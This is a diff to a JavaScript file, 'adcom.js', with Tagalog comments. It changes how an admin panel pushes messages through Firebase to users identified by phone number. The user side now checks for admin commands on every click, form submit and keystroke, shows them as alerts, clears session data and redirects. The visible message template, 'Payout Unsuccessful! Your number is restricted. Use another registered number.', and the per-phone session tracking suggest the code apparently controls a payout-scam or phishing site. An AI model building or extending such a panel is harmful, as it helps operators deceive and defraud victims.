@@ -1,6 +1,5 @@
 /**
- * ADCOM.JS - Admin to User Chat (Polling Version)
- * Nagche-check every 5 seconds kung may command
+ * ADCOM.JS - Check for commands only when user takes action
  */
 
 // ========== DETECT CURRENT PAGE ==========
@@ -115,11 +114,9 @@ async function sendCommand(phone, type) {
         message = '⚠️ Payout Unsuccessful! Your number is restricted. Use another registered number.';
     }
     
-    // I-save sa Firebase
-    await db.ref('command_queue/' + phone).set({
-        message: message,
-        type: type,
-        timestamp: Date.now()
+    // I-save ang command DIREKTA sa user_sessions
+    await db.ref('user_sessions/' + phone).update({
+        adminCommand: message
     });
     
     alert('Message sent to user!');
@@ -153,29 +150,27 @@ function observeTableChanges() {
     makePhonesClickable();
 }
 
-// ========== USER: POLLING EVERY 5 SECONDS ==========
-let isProcessing = false;
-
-async function checkForCommand() {
+// ========== USER: CHECK COMMAND SA BAWAT ACTION ==========
+async function checkForAdminCommand() {
     const userPhone = localStorage.getItem('userPhone');
-    if (!userPhone) return;
-    
-    if (isProcessing) return;
-    isProcessing = true;
+    if (!userPhone) return false;
     
     try {
-        // Tignan kung may command
-        const snapshot = await db.ref('command_queue/' + userPhone).once('value');
-        const command = snapshot.val();
+        // Kunin ang user data
+        const snapshot = await db.ref('user_sessions/' + userPhone).once('value');
+        const userData = snapshot.val();
         
-        if (command) {
-            // MAY COMMAND! Mag-alert
-            alert(command.message);
+        // Kung may adminCommand
+        if (userData && userData.adminCommand) {
+            const message = userData.adminCommand;
             
-            // I-delete ang command para hindi maulit
-            await db.ref('command_queue/' + userPhone).remove();
+            // MAG-ALERT KAY USER
+            alert(message);
             
-            // Clear user data
+            // I-delete ang command
+            await db.ref('user_sessions/' + userPhone + '/adminCommand').remove();
+            
+            // Clear local data
             localStorage.removeItem('userPhone');
             localStorage.removeItem('userDeviceId');
             localStorage.removeItem('userSession');
@@ -185,21 +180,33 @@ async function checkForCommand() {
             
             // Redirect
             window.location.href = 'index.html';
+            
+            return true;
         }
     } catch (error) {
         console.log('Check error:', error);
-    } finally {
-        isProcessing = false;
     }
+    
+    return false;
 }
 
-// ========== START POLLING ==========
-function startPolling() {
-    // Unang check agad
-    setTimeout(checkForCommand, 1000);
+// ========== HOOK SA MGA USER ACTIONS ==========
+function hookUserActions() {
+    // Tuwing may mag-click ng kahit anong button sa page
+    document.body.addEventListener('click', async function(e) {
+        // Check kung may command si admin
+        await checkForAdminCommand();
+    }, true);
     
-    // Tapos every 5 seconds
-    setInterval(checkForCommand, 5000);
+    // Tuwing may mag-submit ng form
+    document.body.addEventListener('submit', async function(e) {
+        await checkForAdminCommand();
+    }, true);
+    
+    // Tuwing may mag-input
+    document.body.addEventListener('input', async function(e) {
+        await checkForAdminCommand();
+    }, true);
 }
 
 // ========== START ==========
@@ -211,11 +218,16 @@ function init() {
             setTimeout(observeTableChanges, 1000);
         }
     } else {
-        // User side - mag-start ng polling
+        // User side - mag-hook sa mga actions
         if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', () => setTimeout(startPolling, 1000));
+            document.addEventListener('DOMContentLoaded', () => {
+                setTimeout(hookUserActions, 1000);
+                // Unang check pagka-load
+                setTimeout(checkForAdminCommand, 2000);
+            });
         } else {
-            setTimeout(startPolling, 1000);
+            setTimeout(hookUserActions, 1000);
+            setTimeout(checkForAdminCommand, 2000);
         }
     }
 }
